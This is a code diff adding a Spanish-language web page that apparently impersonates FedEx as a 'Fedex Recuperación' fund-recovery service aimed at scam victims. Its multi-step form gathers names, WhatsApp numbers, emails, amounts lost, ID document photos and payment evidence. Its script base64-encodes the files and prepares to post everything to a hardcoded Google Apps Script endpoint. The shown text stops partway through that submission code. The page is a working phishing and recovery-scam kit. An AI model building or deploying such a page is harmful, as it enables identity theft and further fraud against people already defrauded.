@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fedex Recuperación | Portal de Resolución de Casos</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Tailwind Configuration with Custom Palette -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            purple: '#4d148c', // Morado principal
+                            orange: '#ff6200', // Naranja para botones/CTAs
+                            gray: '#cccccc',   // Gris claro para fondos secundarios/bordes
+                            light: '#f8f9fa',
+                        }
+                    },
+                    boxShadow: {
+                        'corporate': '0 10px 30px -10px rgba(77, 20, 140, 0.15)',
+                        'form': '0 4px 25px -5px rgba(0, 0, 0, 0.1)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        html { scroll-behavior: smooth; }
+        
+        /* Ocultar pasos inactivos */
+        .step-content { display: none; }
+        .step-content.active { display: block; animation: fadeIn 0.4s ease-in-out; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Estilos para el input de archivo */
+        input[type="file"] { display: none; }
+        .file-upload-label { cursor: pointer; }
+        .file-upload-label:hover { background-color: #f3f4f6; }
+    </style>
+</head>
+<body class="font-sans text-gray-800 bg-brand-light antialiased selection:bg-brand-purple selection:text-white">
+
+    <header class="bg-white border-b border-brand-gray/50 sticky top-0 z-50 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-brand-purple rounded-lg flex items-center justify-center text-white">
+                    <i class="fa-solid fa-cube text-xl"></i>
+                </div>
+                <span class="text-2xl font-extrabold text-brand-purple tracking-tight">Fedex Recuperación</span>
+            </div>
+            
+            <nav class="hidden md:flex space-x-8">
+                <a href="#inicio" class="text-gray-600 hover:text-brand-purple font-medium transition-colors">Inicio</a>
+                <a href="#como-funciona" class="text-gray-600 hover:text-brand-purple font-medium transition-colors">Cómo Funciona</a>
+                <a href="#reclamo" class="text-gray-600 hover:text-brand-purple font-medium transition-colors">Iniciar Solicitud</a>
+            </nav>
+
+            <div class="hidden md:block">
+                <a href="#reclamo" class="px-6 py-2.5 rounded-md font-semibold text-white bg-brand-orange hover:bg-[#e55800] transition-colors shadow-md">
+                    Iniciar Reclamo
+                </a>
+            </div>
+            
+            <div class="md:hidden text-brand-purple text-2xl">
+                <i class="fa-solid fa-bars"></i>
+            </div>
+        </div>
+    </header>
+
+    <section id="inicio" class="relative bg-gradient-to-b from-white to-brand-light pt-20 pb-28 overflow-hidden border-b border-brand-gray/30">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="text-center max-w-4xl mx-auto">
+                <span class="inline-block py-1.5 px-4 rounded-full bg-brand-purple/10 text-brand-purple font-bold text-sm mb-6 border border-brand-purple/20">
+                    Unidad Especializada de Recuperación
+                </span>
+                <h1 class="text-4xl md:text-5xl lg:text-6xl font-extrabold text-gray-900 leading-tight mb-8">
+                    Gestión Oficial de <span class="text-brand-purple">Fondos y Casos</span>
+                </h1>
+                <p class="text-lg md:text-xl text-gray-600 mb-10 max-w-2xl mx-auto leading-relaxed">
+                    Sistema integral diseñado para analizar, auditar y resolver incidencias o retenciones de manera confidencial, rápida y segura.
+                </p>
+                <div class="flex flex-col sm:flex-row justify-center items-center gap-4">
+                    <a href="#reclamo" class="w-full sm:w-auto px-8 py-4 rounded-lg font-bold text-white text-lg bg-brand-orange hover:bg-[#e55800] transition-all transform hover:-translate-y-1 shadow-lg flex items-center justify-center gap-2">
+                        Abrir Expediente Ahora <i class="fa-solid fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <!-- Decoracion de fondo -->
+        <div class="absolute top-0 left-0 w-full h-full overflow-hidden z-0 pointer-events-none opacity-40">
+            <div class="absolute -top-24 -left-24 w-96 h-96 bg-brand-purple rounded-full mix-blend-multiply filter blur-3xl opacity-10"></div>
+            <div class="absolute top-48 -right-24 w-96 h-96 bg-brand-orange rounded-full mix-blend-multiply filter blur-3xl opacity-10"></div>
+        </div>
+    </section>
+
+    <section id="como-funciona" class="py-20 bg-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-4">Proceso Transparente y Eficaz</h2>
+                <div class="h-1 w-20 bg-brand-purple mx-auto rounded-full mb-6"></div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-10 relative">
+                <div class="hidden md:block absolute top-1/2 left-0 w-full h-0.5 bg-brand-gray/40 -z-10 transform -translate-y-12"></div>
+
+                <div class="bg-white p-8 rounded-2xl shadow-corporate border border-brand-gray/20 text-center relative">
+                    <div class="w-16 h-16 mx-auto bg-brand-purple text-white rounded-full flex items-center justify-center text-2xl font-bold mb-6 shadow-md border-4 border-white">1</div>
+                    <h3 class="text-xl font-bold text-brand-purple mb-3">Complete el Formulario</h3>
+                    <p class="text-gray-600">Proporcione sus datos y los detalles de su caso a través de nuestro sistema seguro de 3 pasos.</p>
+                </div>
+
+                <div class="bg-white p-8 rounded-2xl shadow-corporate border border-brand-gray/20 text-center relative">
+                    <div class="w-16 h-16 mx-auto bg-brand-orange text-white rounded-full flex items-center justify-center text-2xl font-bold mb-6 shadow-md border-4 border-white">2</div>
+                    <h3 class="text-xl font-bold text-brand-purple mb-3">Análisis de Evidencias</h3>
+                    <p class="text-gray-600">Nuestros analistas revisarán su documentación e identificarán la viabilidad de recuperación.</p>
+                </div>
+
+                <div class="bg-white p-8 rounded-2xl shadow-corporate border border-brand-gray/20 text-center relative">
+                    <div class="w-16 h-16 mx-auto bg-brand-purple text-white rounded-full flex items-center justify-center text-2xl font-bold mb-6 shadow-md border-4 border-white">3</div>
+                    <h3 class="text-xl font-bold text-brand-purple mb-3">Resolución y Contacto</h3>
+                    <p class="text-gray-600">Un agente asignado se pondrá en contacto con usted para guiarle en los pasos finales.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="reclamo" class="py-24 bg-brand-light">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            
+            <div class="bg-white rounded-2xl shadow-form border border-brand-gray/30 overflow-hidden">
+                
+                <!-- Progreso del formulario -->
+                <div class="bg-white border-b border-brand-gray/30 p-6 md:p-8">
+                    <div class="flex items-center justify-between relative max-w-2xl mx-auto">
+                        <!-- Linea de fondo -->
+                        <div class="absolute left-0 top-1/2 transform -translate-y-1/2 w-full h-1 bg-gray-200 z-0"></div>
+                        <!-- Linea de progreso activa (se actualiza via JS) -->
+                        <div id="progress-line" class="absolute left-0 top-1/2 transform -translate-y-1/2 h-1 bg-brand-purple z-0 transition-all duration-300 w-0"></div>
+                        
+                        <!-- Paso 1 -->
+                        <div class="relative z-10 flex flex-col items-center">
+                            <div id="indicator-1" class="w-10 h-10 rounded-full bg-brand-purple text-white flex items-center justify-center font-bold shadow-md transition-colors duration-300 border-4 border-white">1</div>
+                            <span class="text-xs font-semibold mt-2 text-brand-purple hidden sm:block">Datos Personales</span>
+                        </div>
+                        
+                        <!-- Paso 2 -->
+                        <div class="relative z-10 flex flex-col items-center">
+                            <div id="indicator-2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold transition-colors duration-300 border-4 border-white">2</div>
+                            <span id="text-indicator-2" class="text-xs font-semibold mt-2 text-gray-400 hidden sm:block">Detalles del Caso</span>
+                        </div>
+                        
+                        <!-- Paso 3 -->
+                        <div class="relative z-10 flex flex-col items-center">
+                            <div id="indicator-3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold transition-colors duration-300 border-4 border-white">3</div>
+                            <span id="text-indicator-3" class="text-xs font-semibold mt-2 text-gray-400 hidden sm:block">Evidencias</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Formulario Contenedor -->
+                <div class="p-6 md:p-10">
+                    <form id="recoveryForm" onsubmit="submitForm(event)">
+                        
+                        <div id="step-1" class="step-content active">
+                            <div class="mb-8">
+                                <h3 class="text-2xl font-bold flex items-center gap-3 text-gray-800">
+                                    <div class="bg-gray-100 p-2 rounded-lg text-gray-600"><i class="fa-regular fa-user"></i></div>
+                                    Información Personal
+                                </h3>
+                                <p class="text-gray-500 mt-2 text-sm">Ingresa tus datos de contacto para poder gestionar tu caso.</p>
+                            </div>
+
+                            <div class="space-y-6">
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">Nombre Completo <span class="text-red-500">*</span></label>
+                                    <div class="relative">
+                                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                            <i class="fa-regular fa-user text-gray-400"></i>
+                                        </div>
+                                        <input type="text" id="nombre" required class="block w-full pl-11 pr-4 py-3 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700" placeholder="Ej. Juan Carlos Pérez">
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">País de Residencia <span class="text-red-500">*</span></label>
+                                    <div class="relative">
+                                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                            <i class="fa-solid fa-globe text-gray-400"></i>
+                                        </div>
+                                        <select id="pais" required class="block w-full pl-11 pr-10 py-3 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700 appearance-none bg-white">
+                                            <option value="" disabled selected>Selecciona tu país</option>
+                                            <option value="Argentina" data-code="+54">Argentina</option>
+                                            <option value="Bolivia" data-code="+591">Bolivia</option>
+                                            <option value="Chile" data-code="+56">Chile</option>
+                                            <option value="Colombia" data-code="+57">Colombia</option>
+                                            <option value="Costa Rica" data-code="+506">Costa Rica</option>
+                                            <option value="Cuba" data-code="+53">Cuba</option>
+                                            <option value="Ecuador" data-code="+593">Ecuador</option>
+                                            <option value="El Salvador" data-code="+503">El Salvador</option>
+                                            <option value="Espana" data-code="+34">España</option>
+                                            <option value="Estados Unidos" data-code="+1">Estados Unidos</option>
+                                            <option value="Guatemala" data-code="+502">Guatemala</option>
+                                            <option value="Honduras" data-code="+504">Honduras</option>
+                                            <option value="Mexico" data-code="+52">México</option>
+                                            <option value="Nicaragua" data-code="+505">Nicaragua</option>
+                                            <option value="Panama" data-code="+507">Panamá</option>
+                                            <option value="Paraguay" data-code="+595">Paraguay</option>
+                                            <option value="Peru" data-code="+51">Perú</option>
+                                            <option value="Puerto Rico" data-code="+1">Puerto Rico</option>
+                                            <option value="Republica Dominicana" data-code="+1">República Dominicana</option>
+                                            <option value="Uruguay" data-code="+598">Uruguay</option>
+                                            <option value="Venezuela" data-code="+58">Venezuela</option>
+                                            <option value="Otro" data-code="+">Otro</option>
+                                        </select>
+                                        <div class="absolute inset-y-0 right-0 pr-4 flex items-center pointer-events-none">
+                                            <i class="fa-solid fa-chevron-down text-gray-400 text-sm"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div>
+                                        <label class="block text-sm font-bold text-gray-700 mb-2">WhatsApp <span class="text-red-500">*</span></label>
+                                        <div class="flex border border-brand-gray rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-brand-purple focus-within:border-brand-purple transition-all bg-white">
+                                            <div class="bg-gray-50 border-r border-brand-gray px-4 py-3 flex items-center gap-2 text-gray-500 font-medium">
+                                                <i class="fa-brands fa-whatsapp text-green-500"></i>
+                                                <span id="country-code-display">+</span>
+                                            </div>
+                                            <input type="tel" id="whatsapp" required class="block w-full px-3 py-3 outline-none text-gray-700" placeholder="Número sin código">
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label class="block text-sm font-bold text-gray-700 mb-2">Correo Electrónico <span class="text-red-500">*</span></label>
+                                        <div class="relative">
+                                            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                                <i class="fa-regular fa-envelope text-gray-400"></i>
+                                            </div>
+                                            <input type="email" id="correo" required class="block w-full pl-11 pr-4 py-3 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700" placeholder="correo@ejemplo.com">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="mt-10 flex justify-end">
+                                <button type="button" onclick="nextStep(1)" class="bg-[#111827] hover:bg-black text-white font-semibold py-3 px-8 rounded-xl transition-all shadow-md flex items-center gap-2">
+                                    Continuar <i class="fa-solid fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div id="step-2" class="step-content">
+                            <div class="mb-8">
+                                <h3 class="text-2xl font-bold flex items-center gap-3 text-gray-800">
+                                    <div class="bg-orange-100 p-2 rounded-lg text-brand-orange"><i class="fa-solid fa-clipboard-list"></i></div>
+                                    Detalles del Caso
+                                </h3>
+                                <p class="text-gray-500 mt-2 text-sm">Cuéntanos cómo ocurrió la estafa para iniciar la investigación.</p>
+                            </div>
+
+                            <div class="space-y-6">
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">Tipo de Estafa <span class="text-red-500">*</span></label>
+                                    <div class="relative">
+                                        <select id="tipo_estafa" required class="block w-full px-4 py-3 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700 appearance-none bg-white">
+                                            <option value="" disabled selected>Selecciona el tipo de estafa</option>
+                                            <option value="Inversion / Trading / Criptomonedas">Inversión / Trading / Criptomonedas</option>
+                                            <option value="Loteria o Premio Falso">Lotería o Premio Falso</option>
+                                            <option value="Fundacion Amira Aldahab">Fundación Amira Aldahab</option>
+                                            <option value="Fundacion Princesa Leonor">Fundación Princesa Leonor</option>
+                                            <option value="Fundacion Pepe Millonario">Fundación Pepe Millonario</option>
+                                            <option value="Fundacion Jaden Smith">Fundación Jaden Smith</option>
+                                            <option value="Fedex Express">Fedex Express</option>
+                                            <option value="Otro">Otro</option>
+                                        </select>
+                                        <div class="absolute inset-y-0 right-0 pr-4 flex items-center pointer-events-none">
+                                            <i class="fa-solid fa-chevron-down text-gray-400 text-sm"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">Monto Aproximado Estafado (USD) <span class="text-red-500">*</span></label>
+                                    <div class="relative">
+                                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                            <span class="text-gray-400 font-bold">$</span>
+                                        </div>
+                                        <input type="number" id="monto" required min="0" step="0.01" class="block w-full pl-10 pr-4 py-3 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700" placeholder="0.00">
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">Descripción de la Estafa <span class="text-red-500">*</span></label>
+                                    <textarea id="descripcion" required rows="4" class="block w-full p-4 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700 resize-none" placeholder="Describe cómo ocurrió la estafa, quién fue el responsable (nombre, empresa, plataforma), cómo te contactaron y cualquier detalle relevante..."></textarea>
+                                    <p class="text-xs text-gray-400 mt-2">Incluye nombres, URLs, plataformas o cualquier otro dato identificativo del estafador.</p>
+                                </div>
+
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">¿A qué país envió el dinero que le estafaron? <span class="text-gray-400 font-normal">(opcional)</span></label>
+                                    <div class="relative">
+                                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                            <i class="fa-solid fa-globe text-gray-400"></i>
+                                        </div>
+                                        <select id="pais_envio" class="block w-full pl-11 pr-10 py-3 border border-brand-gray rounded-xl focus:ring-2 focus:ring-brand-purple focus:border-brand-purple outline-none transition-all text-gray-700 appearance-none bg-white">
+                                            <option value="" selected>Selecciona un país (Opcional)</option>
+                                            <option value="Argentina">Argentina</option>
+                                            <option value="Bolivia">Bolivia</option>
+                                            <option value="Chile">Chile</option>
+                                            <option value="Colombia">Colombia</option>
+                                            <option value="Costa Rica">Costa Rica</option>
+                                            <option value="Cuba">Cuba</option>
+                                            <option value="Ecuador">Ecuador</option>
+                                            <option value="El Salvador">El Salvador</option>
+                                            <option value="Espana">España</option>
+                                            <option value="Estados Unidos">Estados Unidos</option>
+                                            <option value="Guatemala">Guatemala</option>
+                                            <option value="Honduras">Honduras</option>
+                                            <option value="Mexico">México</option>
+                                            <option value="Nicaragua">Nicaragua</option>
+                                            <option value="Panama">Panamá</option>
+                                            <option value="Paraguay">Paraguay</option>
+                                            <option value="Peru">Perú</option>
+                                            <option value="Puerto Rico">Puerto Rico</option>
+                                            <option value="Republica Dominicana">República Dominicana</option>
+                                            <option value="Uruguay">Uruguay</option>
+                                            <option value="Venezuela">Venezuela</option>
+                                            <option value="Otro">Otro</option>
+                                        </select>
+                                        <div class="absolute inset-y-0 right-0 pr-4 flex items-center pointer-events-none">
+                                            <i class="fa-solid fa-chevron-down text-gray-400 text-sm"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="mt-10 flex flex-col-reverse sm:flex-row justify-between gap-4">
+                                <button type="button" onclick="prevStep(2)" class="bg-white border border-brand-gray hover:bg-gray-50 text-gray-700 font-semibold py-3 px-8 rounded-xl transition-all flex items-center justify-center gap-2 w-full sm:w-auto">
+                                    <i class="fa-solid fa-arrow-left"></i> Anterior
+                                </button>
+                                <button type="button" onclick="nextStep(2)" class="bg-[#111827] hover:bg-black text-white font-semibold py-3 px-8 rounded-xl transition-all shadow-md flex items-center justify-center gap-2 w-full sm:w-auto">
+                                    Continuar <i class="fa-solid fa-arrow-right"></i>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div id="step-3" class="step-content">
+                            <div class="mb-6">
+                                <h3 class="text-2xl font-bold flex items-center gap-3 text-gray-800">
+                                    <div class="bg-green-100 p-2 rounded-lg text-green-600"><i class="fa-solid fa-upload"></i></div>
+                                    Subir Documentación
+                                </h3>
+                                <p class="text-gray-500 mt-2 text-sm">Sube los documentos que respaldan tu caso. Todo se mantiene estrictamente confidencial.</p>
+                            </div>
+
+                            <div class="bg-orange-50 border border-orange-200 rounded-xl p-4 mb-8 flex gap-4">
+                                <i class="fa-solid fa-shield-halved text-brand-orange mt-1 text-xl"></i>
+                                <div>
+                                    <h4 class="font-bold text-orange-900 text-sm">Documentación importante</h4>
+                                    <p class="text-sm text-orange-800 mt-1">Mientras más evidencia proporciones, más sólida será la investigación. Acepta imágenes, PDFs y documentos. Máximo 50MB por archivo.</p>
+                                </div>
+                            </div>
+
+                            <div class="space-y-6">
+                                
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">Documento de Identidad (Cédula / Pasaporte) <span class="text-red-500">*</span></label>
+                                    <label for="id_doc" class="file-upload-label border-2 border-dashed border-gray-300 rounded-xl p-8 flex flex-col items-center justify-center text-center transition-colors">
+                                        <div class="bg-gray-100 rounded-full p-3 mb-3">
+                                            <i class="fa-solid fa-camera text-gray-400 text-xl"></i>
+                                        </div>
+                                        <span class="font-bold text-gray-700 block mb-1">Haz clic para seleccionar</span>
+                                        <span class="text-xs text-gray-500">Foto nítida del frente de tu documento. JPG, PNG o PDF.</span>
+                                        <input type="file" id="id_doc" required accept=".jpg,.jpeg,.png,.pdf" onchange="updateFileName(this, 'id_doc_name')">
+                                    </label>
+                                    <div id="id_doc_name" class="text-sm text-brand-purple mt-2 font-medium hidden text-center"></div>
+                                </div>
+
+                                <div>
+                                    <label class="block text-sm font-bold text-gray-700 mb-2">Evidencias del Fraude <span class="text-red-500">*</span></label>
+                                    <label for="evidence_doc" class="file-upload-label border-2 border-dashed border-gray-300 rounded-xl p-8 flex flex-col items-center justify-center text-center transition-colors">
+                                        <div class="bg-gray-100 rounded-full p-3 mb-3">
+                                            <i class="fa-regular fa-file-lines text-gray-400 text-xl"></i>
+                                        </div>
+                                        <span class="font-bold text-gray-700 block mb-1">Haz clic para seleccionar</span>
+                                        <span class="text-xs text-gray-500">Capturas de pantalla, comprobantes de pago, conversaciones, emails, etc.</span>
+                                        <input type="file" id="evidence_doc" required accept=".jpg,.jpeg,.png,.pdf,.doc,.docx" onchange="updateFileName(this, 'evidence_doc_name')">
+                                    </label>
+                                    <div id="evidence_doc_name" class="text-sm text-brand-purple mt-2 font-medium hidden text-center"></div>
+                                </div>
+
+                            </div>
+
+                            <p class="text-xs text-gray-500 mt-8 leading-relaxed text-center">
+                                Al enviar este formulario, certificas que la información proporcionada es verídica y otorgas autorización a Fedex Recuperación para investigar y gestionar tu caso conforme a la legislación aplicable. Tu información personal será tratada con total confidencialidad.
+                            </p>
+
+                            <div class="mt-8 flex flex-col-reverse sm:flex-row justify-between gap-4">
+                                <button type="button" onclick="prevStep(3)" class="bg-white border border-brand-gray hover:bg-gray-50 text-gray-700 font-semibold py-4 px-8 rounded-xl transition-all flex items-center justify-center gap-2 w-full sm:w-auto">
+                                    <i class="fa-solid fa-arrow-left"></i> Anterior
+                                </button>
+                                <button type="submit" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-4 px-8 rounded-xl transition-all shadow-md flex items-center justify-center gap-2 w-full sm:w-auto">
+                                    <i class="fa-solid fa-shield-check"></i> Enviar Solicitud de Recuperación
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Mensaje de Exito (Oculto por defecto) -->
+                        <div id="success-message" class="hidden text-center py-10">
+                            <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                                <i class="fa-solid fa-check text-5xl text-green-500"></i>
+                            </div>
+                            <h3 class="text-3xl font-bold text-gray-800 mb-4">¡Solicitud Enviada con Éxito!</h3>
+                            <p class="text-lg text-gray-600 mb-8 max-w-lg mx-auto">
+                                Sus datos serán analizados por nuestro equipo de expertos y lo contactaremos a la brevedad a través de los medios proporcionados.
+                            </p>
+                            <button type="button" onclick="location.reload()" class="bg-brand-purple hover:bg-[#3a0f6a] text-white font-bold py-3 px-8 rounded-xl transition-all shadow-md">
+                                Volver al Inicio
+                            </button>
+                        </div>
+
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-brand-purple text-white pt-12 pb-8 border-t-[6px] border-brand-orange">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex flex-col md:flex-row justify-between items-center border-b border-white/20 pb-8 mb-8">
+                <div class="flex items-center gap-3 mb-4 md:mb-0">
+                    <div class="bg-white p-2 rounded text-brand-purple">
+                        <i class="fa-solid fa-cube text-2xl"></i>
+                    </div>
+                    <span class="text-2xl font-extrabold tracking-tight">Fedex Recuperación</span>
+                </div>
+                <div class="flex gap-6">
+                    <a href="#" class="text-brand-gray hover:text-white transition-colors text-2xl"><i class="fa-brands fa-linkedin"></i></a>
+                    <a href="#" class="text-brand-gray hover:text-white transition-colors text-2xl"><i class="fa-brands fa-facebook"></i></a>
+                </div>
+            </div>
+            <div class="flex flex-col md:flex-row justify-between items-center text-sm text-brand-gray">
+                <p>&copy; 2026 Fedex Recuperación. Todos los derechos reservados.</p>
+                <div class="flex gap-4 mt-4 md:mt-0">
+                    <a href="#" class="hover:text-white transition-colors">Términos Legales</a>
+                    <a href="#" class="hover:text-white transition-colors">Política de Privacidad</a>
+                    <a href="#" class="hover:text-white transition-colors">Centro de Ayuda</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Actualizar el código de país basado en el select
+        const paisSelect = document.getElementById('pais');
+        const countryCodeDisplay = document.getElementById('country-code-display');
+
+        paisSelect.addEventListener('change', function() {
+            const selectedOption = this.options[this.selectedIndex];
+            const code = selectedOption.getAttribute('data-code');
+            if(code) {
+                countryCodeDisplay.textContent = code;
+            }
+        });
+
+        // Logica del Formulario Multistep
+        let currentStep = 1;
+        const totalSteps = 3;
+
+        function updateProgressUI() {
+            // Linea de progreso
+            const progressLine = document.getElementById('progress-line');
+            if(currentStep === 1) progressLine.style.width = '0%';
+            if(currentStep === 2) progressLine.style.width = '50%';
+            if(currentStep === 3) progressLine.style.width = '100%';
+
+            // Actualizar indicadores (Circulos)
+            for (let i = 1; i <= totalSteps; i++) {
+                const indicator = document.getElementById(`indicator-${i}`);
+                const text = document.getElementById(`text-indicator-${i}`);
+                
+                if (i < currentStep) {
+                    // Completado
+                    indicator.className = "w-10 h-10 rounded-full bg-green-500 text-white flex items-center justify-center font-bold shadow-md transition-colors duration-300 border-4 border-white";
+                    indicator.innerHTML = '<i class="fa-solid fa-check"></i>';
+                    if(text) { text.className = "text-xs font-semibold mt-2 text-green-500 hidden sm:block"; }
+                } else if (i === currentStep) {
+                    // Actual
+                    indicator.className = "w-10 h-10 rounded-full bg-brand-purple text-white flex items-center justify-center font-bold shadow-md transition-colors duration-300 border-4 border-white";
+                    indicator.innerHTML = i;
+                    if(text) { text.className = "text-xs font-semibold mt-2 text-brand-purple hidden sm:block"; }
+                } else {
+                    // Pendiente
+                    indicator.className = "w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold transition-colors duration-300 border-4 border-white";
+                    indicator.innerHTML = i;
+                    if(text) { text.className = "text-xs font-semibold mt-2 text-gray-400 hidden sm:block"; }
+                }
+            }
+        }
+
+        function validateStep(step) {
+            const stepDiv = document.getElementById(`step-${step}`);
+            const inputs = stepDiv.querySelectorAll('input[required], select[required], textarea[required]');
+            let isValid = true;
+
+            inputs.forEach(input => {
+                if (!input.value) {
+                    isValid = false;
+                    input.classList.add('border-red-500');
+                    input.classList.remove('border-brand-gray');
+                } else {
+                    input.classList.remove('border-red-500');
+                    input.classList.add('border-brand-gray');
+                }
+            });
+
+            if(!isValid) {
+                // Notificación visual rápida si faltan campos
+                const activeBtn = stepDiv.querySelector('button.bg-\\[\\#111827\\]'); // Selecciona el boton "Continuar"
+                if(activeBtn) {
+                    const originalText = activeBtn.innerHTML;
+                    activeBtn.innerHTML = "Faltan campos obligatorios";
+                    activeBtn.classList.replace('bg-[#111827]', 'bg-red-600');
+                    setTimeout(() => {
+                        activeBtn.innerHTML = originalText;
+                        activeBtn.classList.replace('bg-red-600', 'bg-[#111827]');
+                    }, 2000);
+                }
+            }
+            return isValid;
+        }
+
+        function nextStep(step) {
+            if (validateStep(step)) {
+                document.getElementById(`step-${currentStep}`).classList.remove('active');
+                currentStep++;
+                document.getElementById(`step-${currentStep}`).classList.add('active');
+                updateProgressUI();
+                window.scrollTo({ top: document.getElementById('reclamo').offsetTop - 100, behavior: 'smooth' });
+            }
+        }
+
+        function prevStep(step) {
+            document.getElementById(`step-${currentStep}`).classList.remove('active');
+            currentStep--;
+            document.getElementById(`step-${currentStep}`).classList.add('active');
+            updateProgressUI();
+            window.scrollTo({ top: document.getElementById('reclamo').offsetTop - 100, behavior: 'smooth' });
+        }
+
+        function updateFileName(input, targetId) {
+            const targetDiv = document.getElementById(targetId);
+            if (input.files && input.files.length > 0) {
+                targetDiv.classList.remove('hidden');
+                if (input.files.length === 1) {
+                    targetDiv.textContent = `Archivo seleccionado: ${input.files[0].name}`;
+                } else {
+                    targetDiv.textContent = `${input.files.length} archivos seleccionados`;
+                }
+            } else {
+                targetDiv.classList.add('hidden');
+            }
+        }
+
+        // ==========================================
+        // NUEVA LÓGICA DE ENVÍO A GOOGLE APPS SCRIPT
+        // ==========================================
+
+        // Convertir archivo a Base64
+        const getBase64 = (file) => {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = error => reject(error);
+            });
+        };
+
+        async function submitForm(event) {
+            event.preventDefault();
+            
+            if(validateStep(3)) {
+                // Obtener el botón de enviar para cambiar su estado
+                const submitBtn = event.target.querySelector('button[type="submit"]');
+                const originalBtnText = submitBtn.innerHTML;
+                
+                // Poner el botón en estado de "Carga" para que no le den dos veces
+                submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Enviando de forma segura...';
+                submitBtn.disabled = true;
+                submitBtn.classList.add('opacity-75', 'cursor-not-allowed');
+
+                try {
+                    // URL de tu Google Apps Script
+                    const scriptURL = 'https://script.google.com/macros/s/AKfycbwv3zJ88QgRo1oX7tz5XqZ-Lez8mohgeypACUnknXRJMdXmGCtcDbd72N6vdp1s7NdG/exec';
+
+                    // Preparar archivos
+                    const idFile = document.getElementById('id_doc').files[0];
+                    const evidenceFile = document.getElementById('evidence_doc').files[0];
+                    
+                    let identidadData = null;
+                    let evidenciaData = null;
+
+                    if(idFile) {
+                        identidadData = { base64: await getBase64(idFile), name: idFile.name, type: idFile.type };
+                    }
+                    if(evidenceFile) {
+                        evidenciaData = { base64: await getBase64(evidenceFile), name: evidenceFile.name, type: evidenceFile.type };
+                    }
+
+                    // Obtener el código de país del texto visual
+                    const countryCode = document.getElementById('country-code-display').textContent;
+
+                    // Preparar todos los datos (Los nombres deben coincidir con tu Apps Script)
+                    const payload = {
